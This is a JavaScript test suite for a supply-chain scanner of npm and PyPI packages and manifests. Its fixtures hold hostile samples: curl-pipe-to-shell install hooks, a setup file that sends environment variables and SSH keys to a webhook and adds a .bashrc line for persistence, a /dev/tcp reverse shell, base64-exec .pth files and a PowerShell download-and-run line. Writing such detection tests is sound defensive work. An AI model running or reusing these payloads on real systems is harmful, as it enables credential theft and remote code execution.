'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const zlib = require('node:zlib');
const crypto = require('node:crypto');
const P = require('./pkgscan.js');
const { buildTar, tgz, npmPkg, wheel } = require('./pkgfixture.js');
const { buildZip } = require('./apkfixture.js');

const ids = (r) => r.findings.map((f) => f.id);
const code = async (p) => { try { await p; return 'ok'; } catch (e) { return e.code || 'UNCODED:' + e.message; } };
const manifest = (v) => P.scanManifest(typeof v === 'string' ? v : JSON.stringify(v));

test('tar reader: names, pax long paths, prefix field, entry types', () => {
  const long = 'package/' + 'deep/'.repeat(30) + 'file.js';
  const entries = P.readTar(buildTar([
    { name: 'package/a.txt', data: 'hello' },
    { name: long, data: 'x', pax: true },
    { name: 'file.txt', data: 'pre', prefix: 'package/sub' },
    { name: 'package/link', type: '2', link: '../../etc/passwd' },
  ]));
  assert.equal(entries.length, 4);
  assert.equal(entries[0].name, 'package/a.txt');
  assert.equal(Buffer.from(entries[0].data).toString(), 'hello');
  assert.equal(entries[1].name, long);
  assert.equal(entries[2].name, 'package/sub/file.txt');
  assert.equal(entries[3].type, '2');
  assert.equal(entries[3].link, '../../etc/passwd');
});

test('typosquat detection: lookalikes flagged, real and unrelated names are not', () => {
  const hit = (n, eco = 'npm') => P.lookalike(n, eco);
  assert.equal(hit('lodahs').near, 'lodash');          // transposition
  assert.equal(hit('expresss').near, 'express');       // extra letter
  assert.equal(hit('crossenv').near, 'cross-env');     // dropped dash
  assert.equal(hit('reqeusts', 'pypi').near, 'requests');
  assert.equal(hit('colourama', 'pypi').near, 'colorama');
  assert.equal(hit('l0dash').near, 'lodash');          // digit homoglyph
  assert.equal(hit('python_dateutil', 'pypi'), null);   // PEP 503 normalisation of a real one
  for (const ok of ['lodash', 'express', 'react', 'left-pad', 'my-company-internal-utils', '@types/node', 'is-even', 'tiny']) assert.equal(hit(ok), null, ok);
  for (const ok of ['requests', 'numpy', 'Pillow', 'PyYAML', 'my_private_tool']) assert.equal(hit(ok, 'pypi'), null, ok);
  assert.equal(P.osa('ab', 'ba'), 1);
});

test('package.json: typosquats, URL deps, wildcards, install hooks', () => {
  const r = manifest({
    name: 'my-app',
    dependencies: { lodahs: '^4.0.0', express: '^4.18.0', 'private-lib': 'github:someone/private-lib', anything: '*', '@types/node': '^20.0.0' },
    scripts: { postinstall: 'node setup.js', build: 'tsc' },
  });
  assert.equal(r.info.kind, 'package.json');
  for (const id of ['pkg_typosquat', 'pkg_url_dep', 'pkg_wildcard', 'pkg_install_script']) assert.ok(ids(r).includes(id), `${id}: ${ids(r)}`);
  assert.ok(!r.findings.find((f) => f.id === 'pkg_typosquat').where.some((w) => w.includes('express')));
  const bad = manifest({ name: 'x', scripts: { postinstall: 'curl -s https://evil.example/p.sh | sh' } });
  assert.ok(ids(bad).includes('pkg_install_bad'));
  assert.ok(bad.score >= 60);
  const fine = manifest({ name: 'my-app', dependencies: { react: '^18.2.0', lodash: '^4.17.21' }, scripts: { build: 'vite build', test: 'jest' } });
  assert.equal(fine.level, 'clean');
  const hook = manifest({ name: 'native', scripts: { install: 'node-gyp rebuild' } });
  assert.ok(hook.score < 20, 'a plain native-build hook should stay clean');
  assert.equal(manifest({ name: 'x', dependencies: { stealer: '1.0.0', 'discord-token-grabber': '1.0.0' } }).findings.some((f) => f.id === 'pkg_bad_name'), true);
});

test('package-lock.json: http, git, foreign registry, missing integrity, install scripts', () => {
  const lock = {
    name: 'app', lockfileVersion: 3,
    packages: {
      '': { name: 'app', dependencies: { lodash: '^4.0.0' } },
      'node_modules/lodash': { version: '4.17.21', resolved: 'https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz', integrity: 'sha512-abc' },
      'node_modules/insecure': { version: '1.0.0', resolved: 'http://registry.npmjs.org/insecure/-/insecure-1.0.0.tgz', integrity: 'sha512-abc' },
      'node_modules/fromgit': { version: '1.0.0', resolved: 'git+ssh://git@github.com/x/y.git#abc123' },
      'node_modules/foreign': { version: '1.0.0', resolved: 'https://packages.evil.example/foreign.tgz', integrity: 'sha512-abc' },
      'node_modules/noint': { version: '1.0.0', resolved: 'https://registry.npmjs.org/noint/-/noint-1.0.0.tgz' },
      'node_modules/nativemod': { version: '1.0.0', resolved: 'https://registry.npmjs.org/nativemod/-/nativemod-1.0.0.tgz', integrity: 'sha512-abc', hasInstallScript: true },
      'node_modules/expresss': { version: '1.0.0', resolved: 'https://registry.npmjs.org/expresss/-/expresss-1.0.0.tgz', integrity: 'sha512-abc' },
    },
  };
  const r = manifest(lock);
  assert.equal(r.info.kind, 'package-lock.json');
  for (const id of ['pkg_lock_http', 'pkg_url_dep', 'pkg_lock_registry', 'pkg_lock_no_integrity', 'pkg_lock_install_script', 'pkg_typosquat']) assert.ok(ids(r).includes(id), `${id}: ${ids(r)}`);
  // lockfile v1 layout
  const v1 = manifest({ lockfileVersion: 1, dependencies: { lodahs: { version: '1.0.0', resolved: 'https://registry.npmjs.org/lodahs/-/lodahs-1.0.0.tgz', integrity: 'sha512-x' } } });
  assert.ok(ids(v1).includes('pkg_typosquat'));
});

test('requirements.txt: dependency confusion, trusted-host, git deps, typosquats, unpinned', () => {
  const r = manifest(`# deps
requests==2.31.0
reqeusts==1.0
flask
numpy>=1.20
--extra-index-url https://pypi.internal.example/simple
--trusted-host pypi.internal.example
git+https://github.com/x/y.git@main#egg=y
-e git+https://github.com/a/b.git#egg=b
Django[argon2]==4.2
`);
  assert.equal(r.info.kind, 'requirements.txt');
  for (const id of ['pkg_typosquat', 'pkg_extra_index', 'pkg_trusted_host', 'pkg_url_dep', 'pkg_unpinned_py']) assert.ok(ids(r).includes(id), `${id}: ${ids(r)}`);
  const clean = manifest('requests==2.31.0\nnumpy==1.26.4\npandas==2.1.0\n');
  assert.equal(clean.level, 'clean');
  assert.equal(clean.info.dependencies, 3);
});

test('benign npm tarball stays clean', async () => {
  const r = await P.scanArchive(npmPkg({ name: 'left-pad-ish', version: '1.0.0', main: 'index.js', scripts: { test: 'node test.js' }, dependencies: { lodash: '^4.0.0' } },
    [{ name: 'index.js', data: 'module.exports = (s, n) => String(s).padStart(n);\n' }, { name: 'README.md', data: '# hi' }]));
  assert.equal(r.level, 'clean', ids(r).join());
  assert.equal(r.info.ecosystem, 'npm');
  assert.equal(r.info.name, 'left-pad-ish');
  assert.equal(r.info.format, 'tar.gz');
  assert.equal(r.info.files, 3);
  assert.match(r.info.sha256, /^[0-9a-f]{64}$/);
});

test('malicious npm tarball: install hook runs a file that steals, exfiltrates and persists', async () => {
  const evil = `
const fs = require('fs'), os = require('os'), https = require('https');
const env = JSON.stringify(process.env);
const key = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');
const payload = JSON.stringify({ env, key });
const req = https.request('https://discord.com/api/webhooks/123/abc', { method: 'POST' });
req.end(payload);
eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());
fs.appendFileSync(os.homedir() + '/.bashrc', 'curl http://x | sh\\n');
`;
  const r = await P.scanArchive(npmPkg({ name: 'totally-legit', version: '1.0.0', scripts: { postinstall: 'node lib/setup.js' } }, [{ name: 'lib/setup.js', data: evil }]));
  for (const id of ['pkg_decode_exec', 'pkg_cred_read', 'pkg_exfil_endpoint', 'pkg_env_exfil', 'pkg_persistence', 'pkg_install_exec']) assert.ok(ids(r).includes(id), `${id}: ${ids(r)}`);
  assert.equal(r.score, 100);
  assert.equal(r.level, 'scam');
  assert.deepEqual(r.info.installFiles, ['lib/setup.js']);
  const cred = r.findings.find((f) => f.id === 'pkg_cred_read');
  assert.deepEqual(cred.where, ['lib/setup.js']);
});

test('install hook with curl|sh is critical even without any code files', async () => {
  const r = await P.scanArchive(npmPkg({ name: 'x-tool', version: '1.0.0', scripts: { preinstall: 'curl -s http://45.12.1.9/a.sh | bash' } }));
  assert.ok(ids(r).includes('pkg_install_bad'));
  assert.ok(r.score >= 60);
});

test('obfuscation, hidden Unicode, miners, reverse shells and worm behaviour', async () => {
  const obf = Array.from({ length: 40 }, (_, i) => `var _0x${(0x1a2b + i).toString(16)} = ${i};`).join('\n');
  const r = await P.scanArchive(npmPkg({ name: 'some-lib', version: '1.0.0' }, [
    { name: 'a.js', data: obf },
    { name: 'b.js', data: 'var isAdmin = false; /*‮ } if (isAdmin) { */ begin();' },
    { name: 'c.js', data: 'const pool = "stratum+tcp://xmr.pool.example:3333"; // xmrig' },
    { name: 'd.js', data: 'require("child_process").exec("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")' },
    { name: 'e.js', data: 'execSync("npm publish --access public"); fs.writeFileSync(".github/workflows/x.yml", y)' },
  ]));
  for (const id of ['pkg_obfuscated', 'pkg_hidden_chars', 'pkg_miner', 'pkg_reverse_shell', 'pkg_worm']) assert.ok(ids(r).includes(id), `${id}: ${ids(r)}`);
  assert.equal(r.level, 'scam');
});

test('executables and native binaries; ordinary native addons are fine', async () => {
  const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46]), Buffer.alloc(60)]);
  const r = await P.scanArchive(npmPkg({ name: 'tool', version: '1.0.0' }, [{ name: 'bin/helper', data: elf }, { name: 'dl/update.exe', data: 'MZ' + 'x'.repeat(50) }]));
  assert.ok(ids(r).includes('pkg_binary'));
  assert.ok(ids(r).includes('pkg_executable'));
  const addon = await P.scanArchive(npmPkg({ name: 'tool', version: '1.0.0' }, [{ name: 'build/Release/addon.node', data: elf }, { name: 'prebuilds/linux-x64/x.so', data: elf }]));
  assert.ok(!ids(addon).includes('pkg_binary'), ids(addon).join());
});

test('path traversal and escaping symlinks', async () => {
  const bad = tgz([
    { name: 'package/package.json', data: '{"name":"x"}' },
    { name: 'package/../../../../etc/cron.d/evil', data: '* * * * * root x' },
    { name: 'package/lnk', type: '2', link: '/etc/passwd' },
  ]);
  const r = await P.scanArchive(bad);
  assert.ok(ids(r).includes('pkg_path_traversal'));
  assert.ok(ids(r).includes('pkg_symlink'));
});

test('wheel: malicious .pth, setup-style exec, shadowed commands, typosquatted name', async () => {
  const whl = wheel('reqeusts', '1.0.0', [
    { name: 'reqeusts/__init__.py', data: 'import os, json, requests\nrequests.post("https://webhook.site/abc", data=json.dumps(dict(os.environ)))\n' },
    { name: 'zzz.pth', data: 'import base64; exec(base64.b64decode("cHJpbnQoMSk="))\n' },
  ], '[console_scripts]\npip = reqeusts.cli:main\n');
  const r = await P.scanArchive(whl);
  assert.equal(r.info.ecosystem, 'pypi');
  assert.equal(r.info.name, 'reqeusts');
  for (const id of ['pkg_typosquat', 'pkg_pth', 'pkg_exfil_endpoint', 'pkg_env_exfil', 'pkg_shadow_command', 'pkg_install_exec']) assert.ok(ids(r).includes(id), `${id}: ${ids(r)}`);
  assert.equal(r.level, 'scam');
});

test('sdist: setup.py that downloads and executes code', async () => {
  const sd = tgz([
    { name: 'evilpkg-1.0/PKG-INFO', data: 'Metadata-Version: 2.1\nName: evilpkg\nVersion: 1.0\n' },
    { name: 'evilpkg-1.0/setup.py', data: 'import os, setuptools\nfrom setuptools.command.install import install\nclass X(install):\n    def run(self):\n        os.system("curl -s http://1.2.3.4/x | sh")\nsetuptools.setup(name="evilpkg", cmdclass={"install": X})\n' },
  ]);
  const r = await P.scanArchive(sd);
  assert.equal(r.info.ecosystem, 'pypi');
  assert.ok(ids(r).includes('pkg_remote_exec') || ids(r).includes('pkg_shell_download'));
  assert.ok(ids(r).includes('pkg_py_cmdclass'));
  assert.ok(ids(r).includes('pkg_install_exec'));
  assert.ok(r.score >= 80);
});

test('legit wheel with benign .pth, entry points and normal code stays clean', async () => {
  const whl = wheel('mytool', '2.0.0', [
    { name: 'mytool/__init__.py', data: 'def main():\n    print("hello")\n' },
    { name: 'distutils-precedence.pth', data: "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim();\n" },
  ], '[console_scripts]\nmytool = mytool:main\n');
  const r = await P.scanArchive(whl);
  assert.equal(r.level, 'clean', ids(r).join());
});

test('ordinary code that uses process.env, child_process and fetch is not flagged', async () => {
  const r = await P.scanArchive(npmPkg({ name: 'api-client', version: '3.1.0' }, [{
    name: 'index.js',
    data: `const { execSync } = require('child_process');
const base = process.env.API_URL || 'https://api.example.com';
module.exports.get = (p) => fetch(base + p, { headers: { 'X-Key': process.env.API_KEY } }).then(r => r.json());
module.exports.version = () => execSync('git rev-parse HEAD').toString();
const env = { ...process.env, NODE_ENV: 'production' };
`,
  }]));
  assert.equal(r.level, 'clean', ids(r).join());
});

test('every finding has English, Hindi and a fix; ids are unique; score bounded', async () => {
  const r = await P.scanArchive(npmPkg({ name: 'lodahs', version: '1', scripts: { postinstall: 'node a.js' } }, [{
    name: 'a.js', data: 'eval(atob("YQ=="));require("fs").readFileSync("/root/.ssh/id_rsa");fetch("https://webhook.site/x",{body:JSON.stringify(process.env)});',
  }]));
  assert.ok(r.findings.length >= 5);
  const seen = new Set();
  for (const f of r.findings) {
    assert.ok(f.en.length > 10 && f.hi.length > 10, f.id);
    assert.ok(f.fixEn.length > 5 && f.fixHi.length > 5, f.id);
    assert.ok(['critical', 'high', 'medium', 'low'].includes(f.sev));
    assert.ok(!seen.has(f.id), 'duplicate ' + f.id);
    seen.add(f.id);
  }
  assert.ok(r.score <= 100 && r.score >= 0);
});

test('error codes for bad input', async () => {
  assert.equal(await code(P.scanArchive(new Uint8Array(0))), 'not_archive');
  assert.equal(await code(P.scanArchive(new TextEncoder().encode('this is definitely not an archive file at all'))), 'not_archive');
  assert.equal(await code(P.scanArchive(zlib.gzipSync(Buffer.from('not a tar')))), 'empty_archive');
  const good = npmPkg({ name: 'x', version: '1' }, [{ name: 'a.js', data: 'x'.repeat(5000) }]);
  assert.equal(await code(P.scanArchive(good.subarray(0, 30))), 'bad_archive');
  assert.equal(await code(P.scanArchive(buildZip([]))), 'empty_archive');
  assert.equal(await code(P.scanArchive(new Uint8Array([0x50, 0x4b, ...new Array(40).fill(7)]))), 'bad_archive');
  assert.equal(await code(Promise.resolve().then(() => P.scanManifest(''))), 'empty');
  assert.equal(await code(Promise.resolve().then(() => P.scanManifest('{ nope'))), 'bad_json');
  assert.equal(await code(Promise.resolve().then(() => P.scanManifest('{"hello":"world"}'))), 'unrecognised');
  assert.equal(await code(Promise.resolve().then(() => P.scanManifest('[1,2]'))), 'unrecognised');
});

test('decompression bomb is rejected quickly', async () => {
  const bomb = new Uint8Array(zlib.gzipSync(Buffer.alloc(200 * 1024 * 1024)));
  assert.ok(bomb.length < 1024 * 1024);
  const t0 = Date.now();
  assert.equal(await code(P.scanArchive(bomb)), 'too_big');
  assert.ok(Date.now() - t0 < 8000, `took ${Date.now() - t0}ms`);
});

test('fuzz: corrupted archives and random manifests never throw uncoded errors', async () => {
  const base = npmPkg({ name: 'fuzz-me', version: '1.0.0', scripts: { postinstall: 'node a.js' } }, [{ name: 'a.js', data: 'eval(atob("YQ=="));' }]);
  const rawTar = buildTar([{ name: 'package/package.json', data: '{"name":"a"}' }, { name: 'package/a.js', data: 'x=1' }]);
  const zipBase = wheel('fz', '1', [{ name: 'fz/__init__.py', data: 'x=1' }]);
  let seed = 4242;
  const rnd = () => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed / 0x7fffffff; };
  for (const src of [base, rawTar, zipBase]) {
    for (let i = 0; i < 200; i++) {
      const m = new Uint8Array(src);
      for (let k = 0, n = 1 + Math.floor(rnd() * 8); k < n; k++) m[Math.floor(rnd() * m.length)] = Math.floor(rnd() * 256);
      const cut = rnd() < 0.2 ? m.subarray(0, Math.floor(rnd() * m.length)) : m;
      const c = await code(P.scanArchive(cut, { skipHash: true }));
      assert.ok(!c.startsWith('UNCODED'), c);
    }
  }
  const keys = ['name', 'dependencies', 'devDependencies', 'scripts', 'postinstall', 'packages', 'lockfileVersion', 'resolved', 'integrity', 'version', 'hasInstallScript', ''];
  const vals = ['x', '*', 'git+https://a/b', 'curl x | sh', 1, null, true, 'lodahs', []];
  const gen = (d) => {
    if (d > 3 || rnd() < 0.3) return vals[Math.floor(rnd() * vals.length)];
    const o = {};
    for (let i = 0, n = Math.floor(rnd() * 5); i < n; i++) o[keys[Math.floor(rnd() * keys.length)]] = gen(d + 1);
    return o;
  };
  for (let i = 0; i < 1500; i++) {
    const c = await code(Promise.resolve().then(() => P.scanManifest(JSON.stringify(gen(0)))));
    assert.ok(!c.startsWith('UNCODED'), c);
  }
});

test('hostile content finishes quickly (ReDoS / size guards)', async () => {
  const nasty = [
    'exec('.repeat(40000), 'curl '.repeat(40000), 'readFileSync('.repeat(30000), 'a'.repeat(1900000), '_0x1234 '.repeat(200000),
    'eval(atob('.repeat(30000), 'appendFile '.repeat(40000), '\\x41'.repeat(200000),
  ];
  for (const t of nasty) {
    const t0 = Date.now();
    const c = await code(P.scanArchive(npmPkg({ name: 'big', version: '1' }, [{ name: 'a.js', data: t }]), { skipHash: true }));
    assert.ok(!c.startsWith('UNCODED'), c);
    assert.ok(Date.now() - t0 < 6000, `took ${Date.now() - t0}ms for ${t.slice(0, 20)}`);
  }
  const t0 = Date.now();
  await code(Promise.resolve().then(() => P.scanManifest('x==1\n'.repeat(200000))));
  assert.ok(Date.now() - t0 < 6000);
});

// Regression tests: each of these was a false positive on a real, legitimate package.
test('regression: sibling names, dev/peer dependencies and harmless hooks are not flagged', async () => {
  for (const [a, eco] of [['color', 'npm'], ['typescript3', 'npm'], ['less-loader', 'npm'], ['es6-promise', 'npm'], ['colors', 'npm']]) assert.equal(P.lookalike(a, eco), null, a);
  assert.equal(P.lookalike('expresss', 'npm').near, 'express');
  // archive: devDependencies / peerDependencies are never installed with the package
  const r = await P.scanArchive(npmPkg({
    name: 'lib', version: '1.0.0',
    devDependencies: { lodahs: '*', eslint: 'file:.', tooling: 'webpack/tooling#v1.23.3', x: 'latest' },
    peerDependencies: { typescript: '*' },
    scripts: { postinstall: `node -e "try{require('./postinstall')}catch(e){}"` },
  }, [{ name: 'postinstall.js', data: "console.log('Thanks for using lib! Please donate.');" }]));
  assert.equal(r.level, 'clean', ids(r).join());
  assert.deepEqual(ids(r), ['pkg_install_script']);
  // ...but in the user's own package.json the same devDependencies do matter
  const own = manifest({ name: 'app', devDependencies: { lodahs: '^1.0.0', x: 'latest' } });
  assert.ok(ids(own).includes('pkg_typosquat') && ids(own).includes('pkg_wildcard'));
  // pinned git refs are milder than floating ones
  const pinned = manifest({ name: 'app', dependencies: { a: 'github:o/r#' + 'a'.repeat(40) } });
  const floating = manifest({ name: 'app', dependencies: { a: 'github:o/r' } });
  assert.ok(pinned.score < floating.score);
  // inline node code that does real things is still caught
  assert.ok(ids(manifest({ name: 'x', scripts: { postinstall: `node -e "require('child_process').exec('id')"` } })).includes('pkg_install_bad'));
});

test('regression: bundled data and ordinary Python are not flagged', async () => {
  const r = await P.scanArchive(npmPkg({ name: 'formatter', version: '1.0.0' }, [
    { name: 'index.mjs', data: 'var scripts = { pub: "npm publish ./dist", copy: "npm run copy" };\n' },
    { name: 'plugins/table.js', data: 'var t = "' + '\\x07'.repeat(120) + '";\n' },
    { name: 'wasm.js', data: 'var wasm = "' + 'QUFB'.repeat(1000) + '";\n' },
  ]));
  assert.equal(r.level, 'clean', ids(r).join());
  assert.ok(!ids(r).includes('pkg_worm') && !ids(r).includes('pkg_obfuscated'));
  const many = await P.scanArchive(npmPkg({ name: 'emscripten-bundle', version: '1' }, Array.from({ length: 8 }, (_, i) => ({ name: `d${i}.js`, data: 'var w = "' + 'QUFB'.repeat(1000) + '";' }))));
  assert.equal(many.level, 'clean', 'many weak hints must not add up to an alert');
  const py = await P.scanArchive(tgz([
    { name: 'webstuff-1.0/PKG-INFO', data: 'Metadata-Version: 2.1\nName: webstuff\nVersion: 1.0\n' },
    { name: 'webstuff-1.0/src/cli.py', data: 'with open(startup) as f:\n    eval(compile(f.read(), startup, "exec"), ctx)\n' },
    { name: 'webstuff-1.0/docs/make.bat', data: '@ECHO OFF\r\nsphinx-build %*\r\n' },
  ]));
  assert.equal(py.level, 'clean', ids(py).join());
  // but compile() of decoded or downloaded text is still caught
  const bad = await P.scanArchive(tgz([{ name: 'x-1.0/PKG-INFO', data: 'Name: x\nVersion: 1\n' }, { name: 'x-1.0/setup.py', data: 'exec(compile(base64.b64decode(P), "s", "exec"))' }]));
  assert.ok(ids(bad).includes('pkg_decode_exec'));
});

test('regression: Python tooling patterns found in pip, setuptools and pandas are not flagged', async () => {
  const r = await P.scanArchive(wheel('pip', '26.0', [
    { name: 'pip/_vendor/distlib/util.py', data: "fn = os.path.join(os.path.expanduser('~'), '.pypirc')\nself.filename = fn\n" },
    { name: 'pip/_vendor/distlib/t64.exe', data: 'MZ' + 'x'.repeat(200) },
    { name: 'setuptools/cli-64.exe', data: 'MZ' + 'x'.repeat(200) },
    { name: 'pip/utils.py', data: '# requires CPython >= 3.12.\u200b\n' },
    { name: 'pandas/clipboard.py', data: 'def paste():\n    with subprocess.Popen(["powershell.exe", "-command", "Get-Clipboard"], stdout=PIPE) as p:\n        return p.stdout.read()\n' },
  ], '[console_scripts]\npip = pip._internal.cli.main:main\npip3 = pip._internal.cli.main:main\n'));
  assert.equal(r.level, 'clean', ids(r).join());
  // the same entry point in an unrelated package is still a shadowing attempt
  const evil = await P.scanArchive(wheel('helper-tool', '1.0', [], '[console_scripts]\npip = helper_tool:main\n'));
  assert.ok(ids(evil).includes('pkg_shadow_command'));
  // powershell that downloads is still caught; credential reads with network access are still critical
  const dl = await P.scanArchive(tgz([{ name: 'x-1.0/PKG-INFO', data: 'Name: x\nVersion: 1\n' }, { name: 'x-1.0/a.py', data: 'subprocess.run("powershell -c (New-Object Net.WebClient).DownloadString(\'http://x/y\') | iex")' }]));
  assert.ok(ids(dl).includes('pkg_shell_download') || ids(dl).includes('pkg_remote_exec'));
  const steal = await P.scanArchive(npmPkg({ name: 'pretty-log', version: '1' }, [{ name: 'i.js', data: "const k = fs.readFileSync(os.homedir() + '/.ssh/id_rsa'); fetch('https://example.com/c', { method: 'POST', body: k });" }]));
  assert.ok(ids(steal).includes('pkg_cred_read') && steal.score >= 60);
  // bidi controls remain the real Trojan Source signal
  const bidi = await P.scanArchive(npmPkg({ name: 'pretty-log', version: '1' }, [{ name: 'i.js', data: 'if (x) { /*\u202e*/ }' }]));
  assert.equal(bidi.findings.find((f) => f.id === 'pkg_hidden_chars').sev, 'high');
});
